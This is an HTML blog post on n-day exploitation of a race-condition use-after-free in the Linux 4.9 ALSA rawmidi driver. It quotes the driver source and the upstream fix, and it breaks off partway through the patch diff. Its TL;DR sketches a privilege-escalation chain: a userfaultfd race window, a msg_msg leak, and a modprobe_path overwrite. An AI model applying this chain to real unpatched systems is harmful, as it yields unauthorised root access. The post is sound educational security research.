<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Introduction In the previous article ([[Hunting for Linux kernel public vulnerabilities]]) I described how I identified a good candidate vulnerability using public resources to practise some exploitation techiques."><title>Linux Kernel n-day exploit development</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://1day.dev//icon.png><link href=https://1day.dev/styles.7153093e4d1bbb584a28469cadfa3f88.min.css rel=stylesheet><link href=https://1day.dev/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://1day.dev/js/darkmode.e6934a61ff52b65bd16cdf94b370f112.min.js></script>
<script src=https://1day.dev/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://1day.dev/js/popover.53ad9a087e3feeaaa12b63bfd02d923b.min.js></script>
<script src=https://1day.dev/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://1day.dev/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://1day.dev/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const BASE_URL="https://1day.dev/",fetchData=Promise.all([fetch("https://1day.dev/indices/linkIndex.7cef737e6e86727e44c57e280278081b.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://1day.dev/indices/contentIndex.5e63bf7991a7431c14662e0f09a747cb.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://1day.dev",!1,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://1day.dev",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'â€™':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/1day.dev\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-BZ6HJYMG3K"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-BZ6HJYMG3K",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://1day.dev/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://1day.dev/>ðŸ‘¾ @kiks</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Linux Kernel n-day exploit development</h1><p class=meta>Last updated
Jun 13, 2022</p><ul class=tags><li><a href=https://1day.dev/tags/Exploitation/>Exploitation</a></li><li><a href=https://1day.dev/tags/Linux/>Linux</a></li><li><a href=https://1day.dev/tags/Kernel/>Kernel</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#tldr>TL;DR</a></li><li><a href=#rawmidi-interface>RAWMIDI interface</a><ol><li><a href=#open>open</a></li><li><a href=#write>write</a></li><li><a href=#ioctl>ioctl</a></li></ol></li><li><a href=#vulnerability-analysis>Vulnerability Analysis</a></li><li><a href=#extend-the-race-time-window>Extend the Race Time Window</a></li><li><a href=#exploitation-plan>Exploitation Plan</a></li><li><a href=#information-leak>Information Leak</a><ol><li><a href=#victim-object>Victim Object</a></li><li><a href=#msg_msg>msg_msg</a></li></ol></li><li><a href=#arbitrary-write>Arbitrary Write</a><ol><li><a href=#modprobe_path--uid0>modprobe_path & uid=0</a></li></ol></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#references>References</a></li></ol></nav></details></aside><a href=#introduction><h2 id=introduction><span class=hanchor arialabel=Anchor># </span>Introduction</h2></a><p>In the previous article (<a href=/notes/Hunting-for-Linux-kernel-public-vulnerabilities rel=noopener class=internal-link data-src=/notes/Hunting-for-Linux-kernel-public-vulnerabilities>Hunting for Linux kernel public vulnerabilities</a>) I described how I identified a good candidate vulnerability using public resources to practise some exploitation techiques. In this blog post I will detail the exploitation phase of a race condition that leads to an Use-After-Free in Linux kernel 4.9.223.</p><a href=#tldr><h2 id=tldr><span class=hanchor arialabel=Anchor># </span>TL;DR</h2></a><p>The vulnerability is a Race Condition that causes a write Use-After-Free. The race window has been extended using the userfaultd technique handling page faults from user-space and using <code>msg_msg</code> to leak a kernel address and I/O vectors to obtain a write primitive. With the write primitive, the <code>modprobe_path</code> global variable has been overwritten and a root shell popped.</p><a href=#rawmidi-interface><h2 id=rawmidi-interface><span class=hanchor arialabel=Anchor># </span>RAWMIDI interface</h2></a><p>Before facing the vulnerability, let&rsquo;s see few important things needed to follow this write-up. The vulnerable driver is exposed as a character device in <code>/dev/snd/midiC0D*</code> (or similar name based on the platform) and depends on
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/Kconfig#L21 rel=noopener>CONFIG_SND_RAWMIDI</a>. It exposes the following file operations:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L1507
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>static</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>file_operations</span> <span class=n>snd_rawmidi_f_ops</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>owner</span> <span class=o>=</span>	<span class=n>THIS_MODULE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>read</span> <span class=o>=</span>		<span class=n>snd_rawmidi_read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>write</span> <span class=o>=</span>	<span class=n>snd_rawmidi_write</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>open</span> <span class=o>=</span>		<span class=n>snd_rawmidi_open</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>release</span> <span class=o>=</span>	<span class=n>snd_rawmidi_release</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>llseek</span> <span class=o>=</span>	<span class=n>no_llseek</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>poll</span> <span class=o>=</span>		<span class=n>snd_rawmidi_poll</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>unlocked_ioctl</span> <span class=o>=</span>	<span class=n>snd_rawmidi_ioctl</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>.</span><span class=n>compat_ioctl</span> <span class=o>=</span>	<span class=n>snd_rawmidi_ioctl_compat</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>The ones we are interesed into are <code>open</code>, <code>write</code> and <code>unlocked_ioctl</code>.</p><a href=#open><h3 id=open><span class=hanchor arialabel=Anchor># </span>open</h3></a><p>The open (
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L374 rel=noopener>snd_rawmidi_open</a>) operation allocates everything needed to interact with the device, but what is just necessary to know for us is the first allocation of <code>snd_rawmidi_runtime->buffer</code> as <code>GFP_KERNEL</code> with a size of 4096 (PAGE_SIZE) bytes. This is the
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/include/sound/rawmidi.h#L67 rel=noopener>snd_rawmidi_runtime</a> struct:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>snd_rawmidi_runtime</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>snd_rawmidi_substream</span> <span class=o>*</span><span class=n>substream</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>int</span> <span class=nl>drain</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>	<span class=cm>/* drain stage */</span>
</span></span><span class=line><span class=cl>		     <span class=nl>oss</span><span class=p>:</span> <span class=mi>1</span><span class=p>;</span>	<span class=cm>/* OSS compatible mode */</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* midi stream buffer */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span><span class=p>;</span>	<span class=cm>/* buffer for MIDI data */</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>buffer_size</span><span class=p>;</span>	<span class=cm>/* size of buffer */</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>appl_ptr</span><span class=p>;</span>	<span class=cm>/* application pointer */</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>hw_ptr</span><span class=p>;</span>		<span class=cm>/* hardware pointer */</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>avail_min</span><span class=p>;</span>	<span class=cm>/* min avail for wakeup */</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>avail</span><span class=p>;</span>		<span class=cm>/* max used buffer for wakeup */</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>xruns</span><span class=p>;</span>		<span class=cm>/* over/underruns counter */</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* misc */</span>
</span></span><span class=line><span class=cl>	<span class=n>spinlock_t</span> <span class=n>lock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>wait_queue_head_t</span> <span class=n>sleep</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* event handler (new bytes, input only) */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>event</span><span class=p>)(</span><span class=k>struct</span> <span class=n>snd_rawmidi_substream</span> <span class=o>*</span><span class=n>substream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* defers calls to event [input] or ops-&gt;trigger [output] */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>work_struct</span> <span class=n>event_work</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* private data */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>private_data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>private_free</span><span class=p>)(</span><span class=k>struct</span> <span class=n>snd_rawmidi_substream</span> <span class=o>*</span><span class=n>substream</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><a href=#write><h3 id=write><span class=hanchor arialabel=Anchor># </span>write</h3></a><p>After having allocated everything from the <code>open</code> operation, we can write into the file descriptor like <code>write(fd, &buf, 10)</code>. In that way, it will fill 10 bytes into the <code>snd_rawmidi_runtime->buffer</code> and using <code>snd_rawmidi_runtime->appl_ptr</code> it will remember the offset to start writing again later.
In order to write into that buffer, the driver does the following calls:
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1309 rel=noopener>snd_rawmidi_write</a> =>
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242 rel=noopener>snd_rawmidi_kernel_write1</a> => <code>copy_from_user</code></p><a href=#ioctl><h3 id=ioctl><span class=hanchor arialabel=Anchor># </span>ioctl</h3></a><p>The
<a href=https://elixir.bootlin.com/linux/v4.9.223/C/ident/snd_rawmidi_ioctl rel=noopener>snd_rawmidi_ioctl</a> is responsible to handle IOCTL commands and the one we are interested in is <code>SNDRV_RAWMIDI_IOCTL_PARAMS</code> that calls
<a href=https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L637 rel=noopener>snd_rawmidi_output_params</a> with user-controllable parameter:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=nf>snd_rawmidi_output_params</span><span class=p>(</span><span class=k>struct</span> <span class=n>snd_rawmidi_substream</span> <span class=o>*</span><span class=n>substream</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			      <span class=k>struct</span> <span class=n>snd_rawmidi_params</span> <span class=o>*</span> <span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// [..] few checks
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>params</span><span class=o>-&gt;</span><span class=n>buffer_size</span> <span class=o>!=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>newbuf</span> <span class=o>=</span> <span class=n>kmalloc</span><span class=p>(</span><span class=n>params</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>,</span> <span class=n>GFP_KERNEL</span><span class=p>);</span> <span class=c1>//[1]
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>newbuf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=o>-</span><span class=n>ENOMEM</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>spin_lock_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>oldbuf</span> <span class=o>=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>=</span> <span class=n>newbuf</span><span class=p>;</span> <span class=c1>// [2]
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer_size</span> <span class=o>=</span> <span class=n>params</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>avail</span> <span class=o>=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>buffer_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>runtime</span><span class=o>-&gt;</span><span class=n>appl_ptr</span> <span class=o>=</span> <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>hw_ptr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>spin_unlock_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>runtime</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>kfree</span><span class=p>(</span><span class=n>oldbuf</span><span class=p>);</span> <span class=c1>//[3]
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>// [..]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>This IOCTL is crucial for this vulnerability. With this command it&rsquo;s possible to re-size the internal buffer with an arbitrary value reallocating it[1] and later replace that buffer with the older one [2], that will be freed[3].</p><a href=#vulnerability-analysis><h2 id=vulnerability-analysis><span class=hanchor arialabel=Anchor># </span>Vulnerability Analysis</h2></a><p>The vulnerability has been patched by the commit &ldquo;c13f1463d84b86bedb664e509838bef37e6ea317&rdquo; that introduced a reference counter on the targeted vulnerable buffer. In order to understand where the vulnerbility lived it&rsquo;s a good thing to see its patch:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>diff --git a/include/sound/rawmidi.h b/include/sound/rawmidi.h
</span></span></span><span class=line><span class=cl><span class=gh>index 5432111c8761..2a87128b3075 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/include/sound/rawmidi.h
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/include/sound/rawmidi.h
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -76,6 +76,7 @@ struct snd_rawmidi_runtime {
</span></span></span><span class=line><span class=cl><span class=gu></span>        size_t avail_min;       /* min avail for wakeup */
</span></span><span class=line><span class=cl>        size_t avail;           /* max used buffer for wakeup */
</span></span><span class=line><span class=cl>        size_t xruns;           /* over/underruns counter */
</span></span><span class=line><span class=cl><span class=gi>+       int buffer_ref;         /* buffer reference count */
</span></span></span><span class=line><span class=cl><span class=gi></span>        /* misc */
</span></span><span class=line><span class=cl>        spinlock_t lock;
</span></span><span class=line><span class=cl>        wait_queue_head_t sleep;
</span></span><span class=line><span class=cl><span class=gh>diff --git a/sound/core/rawmidi.c b/sound/core/rawmidi.c
</span></span></span><span class=line><span class=cl><span class=gh>index 358b6efbd6aa..481c1ad1db57 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/sound/core/rawmidi.c
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/sound/core/rawmidi.c
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -108,6 +108,17 @@ static void snd_rawmidi_input_event_work(struct work_struct *work)
</span></span></span><span class=line><span class=cl><span class=gu></span>                runtime-&gt;event(runtime-&gt;substream);
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=gi>+/* buffer refcount management: call with runtime-&gt;lock held */
</span></span></span><span class=line><span class=cl><span class=gi>+static inline void snd_rawmidi_buffer_ref(struct snd_rawmidi_runtime *runtime)
</span></span></span><span class=line><span class=cl><span class=gi>+{
</span></span></span><span class=line><span class=cl><span class=gi>+       runtime-&gt;buffer_ref++;
</span></span></span><span class=line><span class=cl><span class=gi>+}
</span></span></span><span class=line><span class=cl><span class=gi>+
</span></span></span><span class=line><span class=cl><span class=gi>+static inline void snd_rawmidi_buffer_unref(struct snd_rawmidi_runtime *runtime)
</span></span></span><span class=line><span class=cl><span class=gi>+{
</span></span></span><span class=line><span class=cl><span class=gi>+       runtime-&gt;buffer_ref--;
</span></span></span><span class=line><span class=cl><span class=gi>+}
</span></span></span><span class=line><span class=cl><span class=gi>+
</span></span></span><span class=line><span class=cl><span class=gi></span> static int snd_rawmidi_runtime_create(struct snd_rawmidi_substream *substream)
</span></span><span class=line><span class=cl> {
</span></span><span class=line><span class=cl>        struct snd_rawmidi_runtime *runtime;
</span></span><span class=line><span class=cl><span class=gu>@@ -654,6 +665,11 @@ int snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,
</span></span></span><span class=line><span class=cl><span class=gu></span>                if (!newbuf)
</span></span><span class=line><span class=cl>                        return -ENOMEM;
</span></span><span class=line><span class=cl>                spin_lock_irq(&amp;runtime-&gt;lock);
</span></span><span class=line><span class=cl><span class=gi>+               if (runtime-&gt;buffer_ref) {
</span></span></span><span class=line><span class=cl><span class=gi>+                       spin_unlock_irq(&amp;runtime-&gt;lock);
</span></span></span><span class=line><span class=cl><span class=gi>+                       kfree(newbuf);
</span></span></span><span class=line><span class=cl><span class=gi>+                       return -EBUSY;
</span></span></span><span class=line><span class=cl><span class=gi>+               }
</span></span></span><span class=line><span class=cl><span class=gi></span>                oldbuf = runtime-&gt;buffer;
</span></span><span class=line><span class=cl>                runtime-&gt;buffer = newbuf;
</span></span><span class=line><span class=cl>                runtime-&gt;buffer_size = params-&gt;buffer_size;
</span></span><span class=line><span class=cl><span class=gu>@@ -962,8 +978,10 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,
</span></span></span><span class=line><span class=cl><span class=gu></span>        long result = 0, count1;
</span></span><span class=line><span class=cl>        struct snd_rawmidi_runtime *runtime = substream-&gt;runtime;
</span></span><span class=line><span class=cl>        unsigned long appl_ptr;
</span></span><span class=line><span class=cl><span class=gi>+       int err = 0;
